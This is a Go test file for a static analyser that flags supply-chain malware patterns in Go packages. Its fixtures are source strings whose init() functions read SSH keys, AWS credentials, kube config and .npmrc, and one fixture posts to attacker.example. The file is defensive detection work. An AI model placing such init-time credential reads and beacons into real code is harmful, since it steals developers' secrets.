package golang

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestAnalyze_OpenSSHIDRSA_Counts(t *testing.T) {
	t.Parallel()

	src := `package main

import "os"

func init() {
	_, _ = os.ReadFile("/home/user/.ssh/id_rsa")
}
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 1, feats.SensitivePathReads)
}

func TestAnalyze_OSOpenAWSCredentials_Counts(t *testing.T) {
	t.Parallel()

	src := `package main

import "os"

func init() {
	_, _ = os.Open("/home/user/.aws/credentials")
}
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 1, feats.SensitivePathReads)
}

func TestAnalyze_FilepathJoinHomeAWSCredentials_Counts(t *testing.T) {
	t.Parallel()

	// Constant-folded path: home is dynamic but ".aws/credentials"
	// is static. The fold preserves the static parts and matches.
	src := `package main

import (
	"os"
	"path/filepath"
)

func init() {
	home, _ := os.UserHomeDir()
	_, _ = os.ReadFile(filepath.Join(home, ".aws", "credentials"))
}
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 1, feats.SensitivePathReads)
}

func TestAnalyze_FilepathJoinHomeKubeConfig_Counts(t *testing.T) {
	t.Parallel()

	src := `package main

import (
	"os"
	"path/filepath"
)

func init() {
	home, _ := os.UserHomeDir()
	_, _ = os.ReadFile(filepath.Join(home, ".kube", "config"))
}
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 1, feats.SensitivePathReads)
}

func TestAnalyze_LocalConfigPath_NotCounted(t *testing.T) {
	t.Parallel()

	src := `package main

import "os"

func init() {
	_, _ = os.ReadFile("./local-config.toml")
}
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 0, feats.SensitivePathReads)
}

func TestAnalyze_StringLiteralContainsSensitivePath_NotCounted(t *testing.T) {
	t.Parallel()

	// Defends against a regex/lexer implementation: a string literal
	// that textually contains "/.ssh/" must not count without an
	// actual call to a sensitive-path read function.
	src := `package main

const example = "Edit /home/user/.ssh/config"

func init() {
	_ = example
}
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 0, feats.SensitivePathReads)
}

func TestAnalyze_GoSumRead_Counts(t *testing.T) {
	t.Parallel()

	// The go-metrics-sdk BufferZoneCorp variant directly tampers
	// with go.sum — the catalog includes this as a sensitive read.
	src := `package main

import "os"

func init() {
	_, _ = os.ReadFile("/path/to/repo/go.sum")
}
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 1, feats.SensitivePathReads)
}

func TestAnalyze_IOUtilReadFile_Counts(t *testing.T) {
	t.Parallel()

	// Legacy code uses io/ioutil; catalog matches it too.
	src := `package main

import "io/ioutil"

func init() {
	_, _ = ioutil.ReadFile("/home/user/.ssh/id_ed25519")
}
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 1, feats.SensitivePathReads)
}

func TestAnalyze_DynamicPath_NotCounted(t *testing.T) {
	t.Parallel()

	// A fully-dynamic path argument can't be resolved statically.
	// v0.1 doesn't track local-variable contents; the call is
	// invisible to the matrix until the path becomes literal or a
	// filepath.Join with at least one literal arg.
	src := `package main

import "os"

func init() {
	path := getPathFromEnv()
	_, _ = os.ReadFile(path)
}

func getPathFromEnv() string { return "" }
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 0, feats.SensitivePathReads)
}

func TestAnalyze_OSStatAuthorizedKeys_Counts(t *testing.T) {
	t.Parallel()

	// os.Stat reveals presence of ~/.ssh/authorized_keys without
	// opening it; the catalog includes Stat to surface this
	// reconnaissance pattern.
	src := `package main

import "os"

func init() {
	_, _ = os.Stat("/home/user/.ssh/authorized_keys")
}
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 1, feats.SensitivePathReads)
}

func TestAnalyze_IMDSEndpointPath_Counts(t *testing.T) {
	t.Parallel()

	// The go-stdlog BufferZoneCorp variant probes 169.254.169.254;
	// even though IMDS is conventionally accessed via http.Get, a
	// payload that writes the IMDS URL to a tracked file would be
	// caught here too. (More commonly the URL appears in network
	// call args.)
	src := `package main

import "os"

func init() {
	_, _ = os.ReadFile("/var/run/imds-cache/169.254.169.254/identity")
}
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 1, feats.SensitivePathReads)
}

func TestAnalyze_BufferZoneCorpFingerprint_AllThreeFeaturesSpike(t *testing.T) {
	t.Parallel()

	// Joint-feature fingerprint resembling the BufferZoneCorp
	// grpc-client init payload (simplified): one init() function,
	// network egress, and multiple sensitive-path reads. Exercises
	// the multi-feature shape the anomaly threshold (commit 14)
	// will detect.
	src := `package main

import (
	"net/http"
	"os"
	"path/filepath"
)

func init() {
	home, _ := os.UserHomeDir()
	sshKey, _ := os.ReadFile(filepath.Join(home, ".ssh", "id_rsa"))
	awsCreds, _ := os.ReadFile(filepath.Join(home, ".aws", "credentials"))
	npmrc, _ := os.ReadFile(filepath.Join(home, ".npmrc"))
	_, _ = http.Post("https://attacker.example/beacon", "application/octet-stream", nil)
	_ = sshKey
	_ = awsCreds
	_ = npmrc
}
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 1, feats.InitCount)
	assert.Equal(t, 1, feats.NetworkCallSites)
	assert.Equal(t, 3, feats.SensitivePathReads)
}

func TestPatternsCatalog_SensitivePathReads_NoDuplicates(t *testing.T) {
	t.Parallel()

	seen := make(map[CallSite]struct{}, len(SensitivePathReadCallSites))
	for _, cs := range SensitivePathReadCallSites {
		_, dup := seen[cs]
		require.Falsef(t, dup, "duplicate CallSite %+v", cs)
		seen[cs] = struct{}{}
	}
	assert.NotEmpty(t, SensitivePathReadCallSites)
	for _, cs := range SensitivePathReadCallSites {
		assert.NotEmpty(t, cs.Pkg)
		assert.NotEmpty(t, cs.Fn)
	}
}

func TestPatternsCatalog_SensitivePathPatterns_NoDuplicates(t *testing.T) {
	t.Parallel()

	seen := make(map[string]struct{}, len(SensitivePathPatterns))
	for _, p := range SensitivePathPatterns {
		_, dup := seen[p]
		require.Falsef(t, dup, "duplicate pattern %q", p)
		seen[p] = struct{}{}
		assert.NotEmpty(t, p)
	}
	assert.NotEmpty(t, SensitivePathPatterns)
}
